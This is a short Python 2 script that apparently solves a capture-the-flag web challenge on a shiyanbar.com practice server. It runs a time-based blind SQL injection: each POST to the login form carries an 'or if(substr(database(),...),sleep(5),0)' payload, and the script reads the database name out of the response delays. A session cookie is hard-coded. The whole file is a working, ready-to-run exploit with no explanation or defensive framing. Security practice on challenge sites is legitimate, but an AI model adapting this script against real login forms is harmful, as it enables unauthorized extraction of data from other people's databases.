#-*-coding:utf-8-*-

#author:ch3rry

import httplib
import time
import sys
import urllib

headers={
			'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '63',
			'Cookie': 'sample-hash=571580b26c65f306376d4f64e53cb5c7; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1501031527,1501118245,1501136209,1501206641; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*%E6%B8%B8%E5%AE%A2; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1501208808; PHPSESSID=sitdl8nqvvhobikt4i5mv004m3',
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1'
}

payloads = list('qwertyuiopasdfghjklzxcvbnm!@_-,1234567890')

user = ''

#database = ''



for i in range(1,20):
	for payload in payloads:
		url = '/web/5/index.php'
		bodys = "user=1'or if(substr(database(),%s,1)='%s',sleep(5),0) and+'1'='1&pass=NULL" %(i,payload)
		conn = httplib.HTTPConnection('ctf5.shiyanbar.com')
		start_time = time.time()
		conn.request('POST',url,bodys,headers)
		r = conn.getresponse().read()
 		print time.time()-start_time
 		print '*',r
		if time.time()-start_time > 5.0:
			user += payload
			sys.stdout.write('\n[+]'+user)
			break
print 'Done'